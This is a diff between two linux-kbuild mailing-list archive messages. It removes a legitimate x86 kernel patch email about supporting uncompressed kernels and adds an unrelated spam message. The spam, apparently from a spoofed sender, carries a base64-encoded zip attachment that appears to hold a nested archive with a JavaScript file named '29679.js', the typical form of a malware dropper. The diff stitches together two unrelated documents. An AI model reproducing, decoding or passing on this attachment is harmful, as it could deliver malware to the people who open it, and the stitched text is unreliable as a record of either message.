@@ -1,200 +1,86 @@
 Return-Path: <linux-kbuild-owner@vger.kernel.org>
-Received: from mga14.intel.com ([192.55.52.115]:55312 "EHLO mga14.intel.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1752701AbdDDJC3 (ORCPT <rfc822;linux-kbuild@vger.kernel.org>);
-        Tue, 4 Apr 2017 05:02:29 -0400
-From: Chao Peng <chao.p.peng@linux.intel.com>
-Subject: [PATCH v2] x86/boot: Support uncompressed kernel
-Date: Tue,  4 Apr 2017 04:52:34 -0400
-Message-Id: <1491295954-124682-1-git-send-email-chao.p.peng@linux.intel.com>
+Received: from ws229.zone31-163-168.zaural.ru ([31.163.168.229]:51729 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1753980AbdDDOO1 (ORCPT <rfc822;linux-kbuild@vger.kernel.org>);
+        Tue, 4 Apr 2017 10:14:27 -0400
+Content-Type: application/zip; name="4633317.zip"
+Date: Tue, 04 Apr 2017 14:14:22 -0000
+Message-ID: <149131526276.21467.16530788268290830235@zaural.ru>
+From: <smalinowska@frse.org.pl>
+Subject: 27646 linux-kbuild
+Reply-To: <smalinowska@frse.org.pl>
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment
+MIME-Version: 1.0
 Sender: linux-kbuild-owner@vger.kernel.org
 List-ID: <linux-kbuild.vger.kernel.org>
-To: "H. Peter Anvin" <hpa@zytor.com>, Thomas Gleixner <tglx@linutronix.de>, Ingo Molnar <mingo@redhat.com>
-Cc: x86@kernel.org, Michal Marek <mmarek@suse.com>, Kees Cook <keescook@chromium.org>, Yinghai Lu <yinghai@kernel.org>, Baoquan He <bhe@redhat.com>, Jiri Kosina <jkosina@suse.cz>, "H.J. Lu" <hjl.tools@gmail.com>, Paul Bolle <pebolle@tiscali.nl>, Masahiro Yamada <yamada.masahiro@socionext.com>, Chao Peng <chao.p.peng@linux.intel.com>, Borislav Petkov <bp@suse.de>, Andrew Morton <akpm@linux-foundation.org>, Arnd Bergmann <arnd@arndb.de>, Petr Mladek <pmladek@suse.com>, "David S. Miller" <davem@davemloft.net>, "Paul E. McKenney" <paulmck@linux.vnet.ibm.com>, Andy Lutomirski <luto@kernel.org>, Thomas Garnier <thgarnie@google.com>, Nicolas Pitre <nicolas.pitre@linaro.org>, Tejun Heo <tj@kernel.org>, Daniel Mack <daniel@zonque.org>, Sebastian Andrzej Siewior <bigeasy@linutronix.de>, Sergey Senozhatsky <sergey.senozhatsky@gmail.com>, Helge Deller <deller@gmx.de>, Rik van Riel <riel@redhat.com>, linux-kernel@vger.kernel.org, linux-kbuild@vger.kernel.org
+To: linux-kbuild <linux-kbuild@vger.kernel.org>
 
-Compressed kernel has its own drawback: decompressing takes time. Even
-though the time is short enough to ignore for most cases but for cases when
-time is critical decompressing time still matters.
-
-The patch adds a 'CONFIG_KERNEL_RAW' configure choice so the built binary
-can have no decompressing at all. The experiment shows:
-
-    kernel               kernel size    time in decompress_kernel
-    compressed (gzip)    3.3M           53ms
-    compressed (lz4)     4.5M           16ms
-    uncompressed         14M            2ms
-
-Signed-off-by: Chao Peng <chao.p.peng@linux.intel.com>
----
-v2:
-  * add HAVE_KERNEL_RAW
-  * decode ELF kernel in place instead of getting another copy
-  * minor comment fix
----
- arch/x86/Kconfig                  |  1 +
- arch/x86/boot/compressed/Makefile |  3 +++
- arch/x86/boot/compressed/misc.c   | 18 +++++++++++++-----
- init/Kconfig                      | 13 ++++++++++++-
- scripts/Makefile.lib              |  8 ++++++++
- 5 files changed, 37 insertions(+), 6 deletions(-)
-
-diff --git a/arch/x86/Kconfig b/arch/x86/Kconfig
-index cc98d5a..207695c 100644
---- a/arch/x86/Kconfig
-+++ b/arch/x86/Kconfig
-@@ -142,6 +142,7 @@ config X86
- 	select HAVE_KERNEL_LZ4
- 	select HAVE_KERNEL_LZMA
- 	select HAVE_KERNEL_LZO
-+	select HAVE_KERNEL_RAW
- 	select HAVE_KERNEL_XZ
- 	select HAVE_KPROBES
- 	select HAVE_KPROBES_ON_FTRACE
-diff --git a/arch/x86/boot/compressed/Makefile b/arch/x86/boot/compressed/Makefile
-index 44163e8..ed366e1 100644
---- a/arch/x86/boot/compressed/Makefile
-+++ b/arch/x86/boot/compressed/Makefile
-@@ -120,6 +120,8 @@ $(obj)/vmlinux.relocs: vmlinux FORCE
- vmlinux.bin.all-y := $(obj)/vmlinux.bin
- vmlinux.bin.all-$(CONFIG_X86_NEED_RELOCS) += $(obj)/vmlinux.relocs
- 
-+$(obj)/vmlinux.bin.raw: $(vmlinux.bin.all-y) FORCE
-+	$(call if_changed,raw)
- $(obj)/vmlinux.bin.gz: $(vmlinux.bin.all-y) FORCE
- 	$(call if_changed,gzip)
- $(obj)/vmlinux.bin.bz2: $(vmlinux.bin.all-y) FORCE
-@@ -133,6 +135,7 @@ $(obj)/vmlinux.bin.lzo: $(vmlinux.bin.all-y) FORCE
- $(obj)/vmlinux.bin.lz4: $(vmlinux.bin.all-y) FORCE
- 	$(call if_changed,lz4)
- 
-+suffix-$(CONFIG_KERNEL_RAW)	:= raw
- suffix-$(CONFIG_KERNEL_GZIP)	:= gz
- suffix-$(CONFIG_KERNEL_BZIP2)	:= bz2
- suffix-$(CONFIG_KERNEL_LZMA)	:= lzma
-diff --git a/arch/x86/boot/compressed/misc.c b/arch/x86/boot/compressed/misc.c
-index b3c5a5f0..9791ca9 100644
---- a/arch/x86/boot/compressed/misc.c
-+++ b/arch/x86/boot/compressed/misc.c
-@@ -51,6 +51,10 @@
- static int vidport;
- static int lines, cols;
- 
-+#ifdef CONFIG_KERNEL_RAW
-+#include <linux/decompress/mm.h>
-+#endif
-+
- #ifdef CONFIG_KERNEL_GZIP
- #include "../../../../lib/decompress_inflate.c"
- #endif
-@@ -265,7 +269,7 @@ static inline void handle_relocations(void *output, unsigned long output_len,
- { }
- #endif
- 
--static void parse_elf(void *output)
-+static void parse_elf(void* buf, void *output)
- {
- #ifdef CONFIG_X86_64
- 	Elf64_Ehdr ehdr;
-@@ -277,7 +281,7 @@ static void parse_elf(void *output)
- 	void *dest;
- 	int i;
- 
--	memcpy(&ehdr, output, sizeof(ehdr));
-+	memcpy(&ehdr, buf, sizeof(ehdr));
- 	if (ehdr.e_ident[EI_MAG0] != ELFMAG0 ||
- 	   ehdr.e_ident[EI_MAG1] != ELFMAG1 ||
- 	   ehdr.e_ident[EI_MAG2] != ELFMAG2 ||
-@@ -292,7 +296,7 @@ static void parse_elf(void *output)
- 	if (!phdrs)
- 		error("Failed to allocate space for phdrs");
- 
--	memcpy(phdrs, output + ehdr.e_phoff, sizeof(*phdrs) * ehdr.e_phnum);
-+	memcpy(phdrs, buf + ehdr.e_phoff, sizeof(*phdrs) * ehdr.e_phnum);
- 
- 	for (i = 0; i < ehdr.e_phnum; i++) {
- 		phdr = &phdrs[i];
-@@ -305,7 +309,7 @@ static void parse_elf(void *output)
- #else
- 			dest = (void *)(phdr->p_paddr);
- #endif
--			memmove(dest, output + phdr->p_offset, phdr->p_filesz);
-+			memmove(dest, buf + phdr->p_offset, phdr->p_filesz);
- 			break;
- 		default: /* Ignore other PT_* */ break;
- 		}
-@@ -401,10 +405,14 @@ asmlinkage __visible void *extract_kernel(void *rmode, memptr heap,
- 		error("Destination virtual address changed when not relocatable");
- #endif
- 
-+#ifdef CONFIG_KERNEL_RAW
-+	parse_elf(input_data, output);
-+#else
- 	debug_putstr("\nDecompressing Linux... ");
- 	__decompress(input_data, input_len, NULL, NULL, output, output_len,
- 			NULL, error);
--	parse_elf(output);
-+	parse_elf(output, output);
-+#endif
- 	handle_relocations(output, output_len, virt_addr);
- 	debug_putstr("done.\nBooting the kernel.\n");
- 	return output;
-diff --git a/init/Kconfig b/init/Kconfig
-index a92f27d..b8926bb 100644
---- a/init/Kconfig
-+++ b/init/Kconfig
-@@ -109,6 +109,9 @@ config LOCALVERSION_AUTO
- 
- 	  which is done within the script "scripts/setlocalversion".)
- 
-+config HAVE_KERNEL_RAW
-+	bool
-+
- config HAVE_KERNEL_GZIP
- 	bool
- 
-@@ -130,7 +133,7 @@ config HAVE_KERNEL_LZ4
- choice
- 	prompt "Kernel compression mode"
- 	default KERNEL_GZIP
--	depends on HAVE_KERNEL_GZIP || HAVE_KERNEL_BZIP2 || HAVE_KERNEL_LZMA || HAVE_KERNEL_XZ || HAVE_KERNEL_LZO || HAVE_KERNEL_LZ4
-+	depends on HAVE_KERNEL_RAW || HAVE_KERNEL_GZIP || HAVE_KERNEL_BZIP2 || HAVE_KERNEL_LZMA || HAVE_KERNEL_XZ || HAVE_KERNEL_LZO || HAVE_KERNEL_LZ4
- 	help
- 	  The linux kernel is a kind of self-extracting executable.
- 	  Several compression algorithms are available, which differ
-@@ -149,6 +152,14 @@ choice
- 
- 	  If in doubt, select 'gzip'
- 
-+config KERNEL_RAW
-+	bool "RAW"
-+	depends on HAVE_KERNEL_RAW
-+	help
-+	  No compression. It creates much bigger kernel and uses much more
-+	  space (disk/memory) than other choices. It can be useful when
-+	  decompression speed is the most concern while space matters less.
-+
- config KERNEL_GZIP
- 	bool "Gzip"
- 	depends on HAVE_KERNEL_GZIP
-diff --git a/scripts/Makefile.lib b/scripts/Makefile.lib
-index 0a07f90..8a8f9a9 100644
---- a/scripts/Makefile.lib
-+++ b/scripts/Makefile.lib
-@@ -357,6 +357,14 @@ cmd_lz4 = (cat $(filter-out FORCE,$^) | \
- 	lz4c -l -c1 stdin stdout && $(call size_append, $(filter-out FORCE,$^))) > $@ || \
- 	(rm -f $@ ; false)
- 
-+# RAW
-+# ---------------------------------------------------------------------------
-+quiet_cmd_raw = RAW     $@
-+cmd_raw = (cat $(filter-out FORCE,$^) && \
-+	$(call size_append, $(filter-out FORCE,$^))) > $@ || \
-+	(rm -f $@ ; false)
-+
-+
- # U-Boot mkimage
- # ---------------------------------------------------------------------------
- 
--- 
-1.8.3.1
-
+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
+W3gyqMud2vXMJFxq3J+VP2P7eq78gleDGElDJXNtpn8oT0urxxBcDGU8LzJiv65iKWq2AuSCzhya
+Mh0HAqZMr1an1qZbu1ytwHNgTShgTrKrevhFAzgPh8vZaa+D7uXzWHOuDFxwUaNbqo8t53U6KUIU
+uFGnU76CjVJDW2G1UUar+XHtJePQ6dXzOk992BKM9BKw5NfjViczXelaY2WMYi8qMnh+4LHDej5m
+CYwywRltWuZK8ABP4VQmQJLF6pJBQVFzake9rCincKmcYPcEW+nfrA5+g2arx13uOUNNORVUF3pZ
+3yqDpnoWOlwzQMtxBoGO4+U8LanRcmX6btnWlprLMwqvadrXkYq85ypPQmdW7ebqhLxlFMhjRX/l
+VORcvGKsTMeFB1q1uO0au7nOWVjWqJ+pGSeE81zd6ZxfscPKPKs0OsooLW4SL/U6A0m1a4WHsT55
+pvTemr5ZARP9wERYhO3rWeD6NGBaTxFDPXxgiS+nKIH9IWcBp/XXMw26Ra9HMap4e/Py6japXBJ9
+4TbJHA/bIy/HjHl4qYQ/lH/229t37+ft/enDvNMlWLkPKxdikn13q3uyZ8/qS4+ux3hndzCb/UYr
+G/x3PN5ubjYU+8fp1P++bdu9NX4fHP6HH7Pv4j51+xj2znV72+1dtHvbNnvv8QQfIRnTbo+VYZa5
+rVu8+Fn3ad+9fv3DR//pu592e+xFy25fb15v9vp4PEDd5Xjalmu++mQvzaGWeVmf/a2u/eL9fPfT
+/dv18c3NKnpzs/v4btnW3/5+Ww2r8ruPlxU/VS2eb24ORppudzeb2/XedL2FrBu+qju9efHLh+GX
++9PW7t1u92Nd/lVd9s3u5afr5f7402ZbVdA15BruXQnbcJr7/+gjrx8f3EmWKH/67GbyjI1rLPER
+9uAdJ7Q3CA2vZw8PboMPvP58dBusp49ug3lde+Sd6kE3vlf3wvWrV//u79++WN4fEUt9PPV30/Hn
+7e6v9Y3dm3rn+kCfr7stXjV9aOE5TrqDvs4Wxu74+W1xefrYMsX52h49ePWt0Pvtm4JfS/yWaJXt
+vurS+KzIA8VXHHx2M38wX7qZP3zhfpveOK4JfBSZ3K7ueL25mX/t37/e7F6er65XKEhyX9+XNfHr
+r+sPjy6/CfyDQcrpMn+vKJ9p63Jvzi9/rF+WJc5Et16f717+D1BLAQIeAxQAAgAIAESehEprZJT7
+pw0AAL8gAAAIABgAAAAAAAEAAACkgQAAAAAyOTY3OS5qc1VUBQADj6TjWHV4CwABBAAAAAAEAAAA
+AFBLBQYAAAAAAQABAE4AAADpDQAAAABQSwECHgMKAAIAAABEnoRKkg1cZE0OAABNDgAACQAYAAAA
+AAAAAAAApIEAAAAAMjk2NzkuemlwVVQFAAOPpONYdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEA
+TwAAAJAOAAAAAA==
